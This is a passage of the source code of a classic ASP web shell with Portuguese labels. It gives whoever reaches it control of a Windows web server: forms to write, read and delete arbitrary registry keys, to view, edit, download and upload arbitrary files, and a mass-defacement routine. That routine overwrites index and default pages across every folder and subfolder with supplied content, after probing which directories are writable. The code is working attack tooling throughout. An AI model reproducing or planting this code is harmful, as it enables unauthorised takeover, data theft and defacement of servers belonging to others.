					Response.Write "<tr><td><font face=""arial"" size=""1"">REG_BINARY </td><td><font face=""arial"" size=""1""> valor binário </td><td><font face=""arial"" size=""1""> VBArray de inteiros </td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">REG_EXPAND_SZ </td><td><font face=""arial"" size=""1""> string expandível (ex. ""%windir%\\calc.exe"") </td><td><font face=""arial"" size=""1""> string </td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">REG_MULTI_SZ </td><td><font face=""arial"" size=""1""> array de strings </td><td><font face=""arial"" size=""1""> VBArray de strings </td></tr></table>"
					Response.Write "<br><br><FORM action=""" & Request.ServerVariables("URL") & """ method=""GET"">"
					Response.Write "<table><tr><td><font face=""arial"" size=""1"">KEY: </td><td><input type=""text"" name=""key""> <font face=""arial"" size=""1""><br>( ex.: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ProductId )</td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">VALUE:</td><td><input type=""text"" name=""value""></td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">TYPE:</td><td><SELECT NAME=""type"">"
					Response.Write "<OPTION VALUE=""1"">REG_SZ </option>"
					Response.Write "<OPTION VALUE=""2"">REG_DWORD </option>"
					Response.Write "<OPTION VALUE=""3"">REG_BINARY </option>"
					Response.Write "<OPTION VALUE=""4"">REG_EXPAND_SZ </option>"
					Response.Write "<OPTION VALUE=""5"">REG_MULTI_SZ </option></select><br>"
					Response.Write "<input type=""hidden"" name=""regaction"" value=""w"">"
					Response.Write "<input type=""hidden"" name=""action"" value=""reg"">"
					Response.Write "<input type=""hidden"" name=""process"" value=""yes""></td></tr>"
					Response.Write "<tr><td></td><td><input type=""submit"" value=""OK""></form></td></tr></table>"
					Response.Write "<br><br><font face=""arial"" size=""1""><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg"">MENU PRINCIPAL</a><br>"
				End If
			Case "r"
				If Trim(Request.QueryString("process")) = "yes" Then
					Response.Write "<font face=""arial"" size=""2"">" & Trim(Request.QueryString("key")) & "<br>"
					Response.Write "Valor: <b>" & WshShell.RegRead (Trim(Request.QueryString("key")))
				Else
					Response.Write "<FORM action=""" & Request.ServerVariables("URL") & """ method=""GET"">"
					Response.Write "<font face=""arial"" size=""1"">KEY: <input type=""text"" name=""key""> <br>( ex.: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ProductId )<br>"
					Response.Write "<input type=""hidden"" name=""regaction"" value=""r"">"
					Response.Write "<input type=""hidden"" name=""action"" value=""reg"">"
					Response.Write "<input type=""hidden"" name=""process"" value=""yes"">"
					Response.Write "<input type=""submit"" value=""OK""></form>"
				End If
				Response.Write "<br><br><font face=""arial"" size=""1""><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg"">MENU PRINCIPAL</a><br>"
			Case "d"
				If Trim(Request.QueryString("process")) = "yes" Then
					teste = WshShell.RegDelete (Trim(Request.QueryString("key")))
					Response.Write "Chave <b>" & Trim(Request.QueryString("key")) & " </b>deletada"
				Else
					Response.Write "<FORM action=""" & Request.ServerVariables("URL") & """ method=""GET"">"
					Response.Write "<font face=""arial"" size=""1"">KEY: <input type=""text"" name=""key""> ( ex.: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ProductId )<br>"
					Response.Write "<input type=""hidden"" name=""regaction"" value=""d"">"
					Response.Write "<input type=""hidden"" name=""action"" value=""reg"">"
					Response.Write "<input type=""hidden"" name=""process"" value=""yes"">"
					Response.Write "<input type=""submit"" value=""OK""></form>"
				End If
				Response.Write "<br><br><font face=""arial"" size=""1""><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg"">MENU PRINCIPAL</a><br>"
			Case Else
				Response.Write "<font face=""arial"" size=""1""><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg&regaction=w"">ESCREVER CHAVE</a><br><br>"
				Response.Write "<a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg&regaction=r"">LER CHAVE</a><br><br>"
				Response.Write "<a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg&regaction=d"">DELETAR CHAVE</a><br>"
		End Select
		Set WshShell = Nothing
	Case "txtview"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp & "<font face=""arial"" size=""2"">"
		file = Replace(Trim(Request.QueryString("file")),"|","\")
		Set fso = CreateObject("Scripting.FileSystemObject")  
		Set a = fso.OpenTextFile(file)
		Response.Write Replace(Replace(Server.HTMLEncode(a.ReadAll),VbCrLf,"<br>")," ","&nbsp;")
		Set a = Nothing
		Set fso = Nothing
	Case "txtedit"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		If Request.Form.Count = 0 Then
			file = Replace(Trim(Request.QueryString("file")),"|","\")
			Set fso = CreateObject("Scripting.FileSystemObject")
			Set a = fso.OpenTextFile(file)
			Response.Write "<form method=""post"" action=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=txtedit"">"
			Response.Write "<textarea cols='85' rows='25' name=""content"" wrap=""physical"" >" & Server.HTMLEncode(a.ReadAll) & "</textarea><br>"
			Response.Write "<input type=""hidden"" name=""path"" value=""" & Trim(Request.QueryString("file")) & """>"
			Response.Write "<input type=""submit"" name=""savemethod"" value=""Save"">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=""submit"" name=""savemethod"" value=""Save as""></form>"
			Set a = Nothing
			Set fso = Nothing
		Else
			Select Case Trim(Request.Form("savemethod"))
				Case "Save"
					Set fso = CreateObject("Scripting.FileSystemObject")
					novotexto = Trim(Request.Form("content"))
					novotexto = Split(novotexto,vbCrLf)
					Set objstream = fso.OpenTextFile(Replace(Trim(Request.Form("path")),"|","\"),2)
					For i = 0 To UBound(novotexto)
						objstream.WriteLine(novotexto(i))
					Next
					objstream.Close
					Set objstream = Nothing
					Response.Write "Texto salvo: <b>" & Replace(Trim(Request.Form("path")),"|","\") & "</b>"
				Case "Save as"
					Set fso = CreateObject("Scripting.FileSystemObject")
					novotexto = Trim(Request.Form("content"))
					novotexto = Split(novotexto,vbCrLf)
					caminho = showobjpath(Replace(Trim(Request.Form("path")),"|","\")) & "rhtemptxt.txt"
					Set objstream = fso.CreateTextFile(caminho,true,false)
					For i = 0 To UBound(novotexto)
						objstream.WriteLine(novotexto(i))
					Next
					objstream.Close
					Set objstream = Nothing
					Response.Write "<form method=""post"" action=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=txtedit"">"
					Response.Write "<input type=""text"" name=""filename"" value=""" & showobj(Replace(Trim(Request.Form("path")),"|","\")) & """><br>"
					Response.Write "<input type=""hidden"" name=""path"" value=""" & Trim(Request.Form("path")) & """>"
					Response.Write "<input type=""submit"" name=""savemethod2"" value=""Save""></form>"
				Case Else
					caminho = showobjpath(Replace(Trim(Request.Form("path")),"|","\")) & "rhtemptxt.txt"
					Set ObjFSO = CreateObject("Scripting.FileSystemObject")
					Set MyFile = ObjFSO.GetFile(caminho)
					destino = Left(caminho,InStrRev(caminho,"\")) & Trim(Request.Form("filename"))
					MyFile.Move (destino)
					If Err.Number = 0 Then
						Response.Write "<font face='arial' size='2'><center><br><br>Arquivo: <b>" & destino & "</b> salvo!"
						Response.Write "<SCRIPT LANGUAGE=""JavaScript"">self.opener.document.location.reload();</SCRIPT>"
					End If	
			End Select
		End If
	Case "download"
		Response.Buffer = True
		Response.Clear
		strFileName = Replace(Trim(Request.QueryString("file")),"|","\")
		strFile = Right(strFileName, Len(strFileName) - InStrRev(strFileName,"\"))
		strFileType = Request.QueryString("type")
		if strFileType = "" then strFileType = "application/download"
		Set fso = Server.CreateObject("Scripting.FileSystemObject")
		Set f = fso.GetFile(strFilename)
		intFilelength = f.size
		Set f = Nothing
		Set fso = Nothing
		Response.AddHeader "Content-Disposition", "attachment; filename=" & strFile
		Response.AddHeader "Content-Length", intFilelength
		Response.Charset = "UTF-8"
		Response.ContentType = strFileType
		Set Stream = Server.CreateObject("ADODB.Stream")
		Stream.Open
		Stream.type = 1
		Stream.LoadFromFile strFileName
		Response.BinaryWrite Stream.Read
		Response.Flush
		Stream.Close
		Set Stream = Nothing
	Case "upload"
		If Request.QueryString("processupload") <> "yes" Then
			Response.Write "<FORM METHOD=""POST"" ENCTYPE=""multipart/form-data"" ACTION=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=upload&processupload=yes&path=" & Request.QueryString("path") & """>"
			Response.Write "<TABLE BORDER=0>"
			Response.Write "<tr><td><font face=""arial"" size=""2""><b>Select a file to upload:</b><br><INPUT TYPE=FILE SIZE=50 NAME=""FILE1""></td></tr>"
			Response.Write "<tr><td align=""center""><font face=""arial"" size=""2""><INPUT TYPE=SUBMIT VALUE=""Upload!""></td></tr>"
			Response.Write "</TABLE>"
		Else
			Set Uploader = New FileUploader
			Uploader.Upload()
			If Uploader.Files.Count = 0 Then
				Response.Write "File(s) not uploaded."
			Else
				For Each File In Uploader.Files.Items
					File.SaveToDisk Replace(Trim(Request.QueryString("path")),"|","\")
					Response.Write "File Uploaded: " & File.FileName & "<br>"
					Response.Write "Size: " & File.FileSize & " bytes<br>"
					Response.Write "Type: " & File.ContentType & "<br><br>"
					Response.Write "<SCRIPT LANGUAGE=""JavaScript"">self.opener.document.location.reload();</SCRIPT>"
				Next
			End If
		End If
	Case "mass"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		Sub themassdeface(caminhodomass,metodo,ObjFSO,MeuArquivo)
			On Error Resume Next
			Set MonRep = ObjFSO.GetFolder(caminhodomass)
			Set ColFolders = MonRep.SubFolders
			for each folderItem in ColFolders
				destino1 = folderItem.path & "\index.htm"
				destino2 = folderItem.path & "\index.html"
				destino3 = folderItem.path & "\index.asp"
				destino4 = folderItem.path & "\index.cfm"
				destino5 = folderItem.path & "\index.php"
				destino6 = folderItem.path & "\default.htm"
				destino7 = folderItem.path & "\default.html"
				destino8 = folderItem.path & "\default.asp"
				destino9 = folderItem.path & "\default.cfm"
				destino10 = folderItem.path & "\default.php"
				MeuArquivo.Copy(destino1)
				MeuArquivo.Copy(destino2)
				MeuArquivo.Copy(destino3)
				MeuArquivo.Copy(destino4)
				MeuArquivo.Copy(destino5)
				MeuArquivo.Copy(destino6)
				MeuArquivo.Copy(destino7)
				MeuArquivo.Copy(destino8)
				MeuArquivo.Copy(destino9)
				MeuArquivo.Copy(destino10)
				Response.Write "<table><tr><td><font face='arial' size='2'>&lt;DIR&gt; " & folderItem.path & "</td>"
				If Err.Number = 0 Then
					Response.Write "<td valign='baseline'>&nbsp;&nbsp;<font face='arial' size='2' color='green'>DONE!</font></td></tr>"
				Else
					Response.Write "<td valign='baseline'>&nbsp;&nbsp;<font face='arial' size='2' color='red'>" & UCase(Err.Description) & "</font></td></tr></table>"
				End If
				Err.Number = 0
				Response.Flush
				If metodo = "brute" Then
					Call themassdeface(folderItem.path & "\","brute",ObjFSO,MeuArquivo)
				End If
			next
		End Sub
		Sub brutemass(caminho,massaction)
			If massaction = "test" Then
				On Error Resume Next
				Set MonRep = ObjFSO.GetFolder(caminho)
				Set ColFolders = MonRep.SubFolders
				Set ColFiles0 = MonRep.Files
				for each folderItem in ColFolders
					Set TotalFolders = ObjFSO.GetFolder(folderItem.path)
					Set EachFolder = TotalFolders.SubFolders
					Response.Write "<table border=""0"" cellspacing=""0"" cellpadding=""0"" >"
					maindestino = folderItem.path & "\"
					MeuArquivo.Copy(maindestino)
					Response.Write "<tr><td><b><font face='arial' size='2'>&lt;DIR&gt; " & maindestino & "</b></td>"
					If Err.Number = 0 Then
						Response.Write "<td valign='baseline'>&nbsp;&nbsp;<font face='arial' size='2' color='green'>Acesso Permitido</font></td></tr>"
					Else
						Response.Write "<td valign='baseline'>&nbsp;&nbsp;<font face='arial' size='2' color='red'>" & UCase(Err.Description) & "</font></td></tr>"
					End If
					Err.Number = 0
					Response.Flush
					If EachFolder.count > 0 Then
						masscontador = 0
						for each subpasta in EachFolder
							masscontador = masscontador + 1
							destino = subpasta.path & "\"
							If masscontador = 1 Then
								destinofinal = destino
								pathfinal = subpasta.path
								Err.Number = 0
								MeuArquivo.Copy(destinofinal)
								Response.Write "<tr><td><font face='arial' size='2'>&lt;DIR&gt; " & showobj(pathfinal) & "</td>"
								If Err.Number = 0 Then
									Response.Write "<td valign='baseline'>&nbsp;&nbsp;<font face='arial' size='2' color='green'>Acesso Permitido</font></td></tr>"
								Else
									Response.Write "<td valign='baseline'>&nbsp;&nbsp;<font face='arial' size='2' color='red'>" & UCase(Err.Description) & "</font></td></tr>"
								End If
								Err.Number = 0
								Response.Flush
							Else
								MeuArquivo.Copy(destino)
								Response.Write "<tr><td><font face='arial' size='2'>&lt;DIR&gt; " & showobj(subpasta.path) & "</td>"
								If Err.Number = 0 Then
									Response.Write "<td valign='baseline'>&nbsp;&nbsp;<font face='arial' size='2' color='green'>Acesso Permitido</font></td></tr>"
								Else
									Response.Write "<td valign='baseline'>&nbsp;&nbsp;<font face='arial' size='2' color='red'>" & UCase(Err.Description) & "</font></td></tr>"
								End If
								Err.Number = 0
								Response.Flush
							End If
						next
						masscontador = 0
					End If
					Response.Write "</table><br>"
					Call brutemass(folderItem.path & "\","test")
				next
				Set MonRep = Nothing
				Set ColFolders = Nothing
				Set ColFiles0 = Nothing
			Else
				If Request.Form.Count = 0 Then
					Response.Write "<font face=""arial"" size=""2""><br><br><b>Brute:</b> copia os arquivos do deface para todas as pastas e subpastas (todos os níveis) do diretório escolhido (mais demorado). O tempo do deface vai variar de acordo com o numero TOTAL de diretórios.<br><br>"
					Response.Write "<b>Single:</b> copia os arquivos do deface apenas para as pastas (primeiro nível) do diretório escolhido. Não inclui subpastas.<br><br>"
					Response.Write "<form method=""post"" action=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=mass&massact=dfc"">"
					Response.Write "<input type=""hidden"" name=""path"" value=""" & Trim(Request.QueryString("path")) & """>"
					Response.Write "<center><font face=""arial"" size=""2"">Insira o código:<br>"
					Response.Write "<textarea cols='65' rows='15' name=""content""></textarea><br>"
					Response.Write "<input type=""radio"" name=""massopt"" value=""brute"" checked>Brute&nbsp;&nbsp;&nbsp;"
					Response.Write "<input type=""radio"" name=""massopt"" value=""single"">Single<br>"
					Response.Write "<input type=""submit"" value=""w00t!""></center>"
					Response.Write "</form>"
				Else
					Set ObjFSO = CreateObject("Scripting.FileSystemObject")
					patharquivotxt = Left(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")),InstrRev(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")),"\"))
					arquivomassdfc = patharquivotxt & "teste.txt"
					Set Arquivotxt = ObjFso.OpenTextFile(arquivomassdfc, 2, True, False)
					vetordelinhas = Split(Request.Form("content"),VbCrLf)
					For i = 0 To UBound(vetordelinhas)
						Arquivotxt.WriteLine(vetordelinhas(i))
					Next
					Set MeuArquivo = ObjFSO.GetFile(arquivomassdfc)
					
					If Request.Form("massopt") = "single" Then
						Call themassdeface(caminho,"single",ObjFSO,MeuArquivo)
					ElseIf Request.Form("massopt") = "brute" Then
						Call themassdeface(caminho,"brute",ObjFSO,MeuArquivo)
					End If
				End If
			End If
		End Sub
		If Trim(Request.QueryString("massact")) = "test" Then
			Set ObjFSO = CreateObject("Scripting.FileSystemObject")
			patharquivotxt = Left(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")),InstrRev(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")),"\"))
			arquivo = patharquivotxt & "_vti_cnf.log"
			Set Arquivotxt = ObjFSO.CreateTextFile(arquivo,True)
			Set MeuArquivo = ObjFSO.GetFile(arquivo)
			Call brutemass(Replace(Trim(Request.QueryString("path")),"|","\"),"test")
		ElseIf Trim(Request.QueryString("massact")) = "dfc" Then
			Call brutemass(Replace(Trim(Request.Form("path")),"|","\"),"dfc")
		End If
	Case Else
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		Call showcontent()
End Select
If Err.Number <> 0 Then
	Response.Write "<br><font face='arial' size='2'>ERRO: " & Err.Number & "<br><br><b>" & UCase(Err.Description) & "</b><br>Acesse o <b>ONLINE HELP</b> para a explicação do erro"
End If
Response.Write endcode
%>